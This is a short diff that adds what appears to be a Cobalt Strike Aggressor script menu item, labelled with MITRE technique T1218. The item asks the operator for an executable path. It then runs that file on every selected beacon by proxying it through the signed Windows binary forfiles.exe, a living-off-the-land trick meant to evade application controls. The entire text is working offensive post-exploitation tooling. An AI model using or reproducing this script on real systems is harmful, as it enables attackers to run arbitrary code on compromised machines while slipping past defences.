@@ -1,0 +1,16 @@
+# LOLBin 'forfiles'
+item "forfiles (LOLBIN) - T1218"{
+	local('$bid');
+		foreach $bid ($1){
+			forfiles($bid);
+		}
+	}
+
+
+
+#LOLBin 'forfiles' 
+sub forfiles{ 
+prompt_text("Filepath To Executable", "", lambda({ 
+brun($bids, "forfiles.exe /p c:\\windows\\system32 /m notepad.exe /c $1"); 
+}, $bids => $1)); 
+}
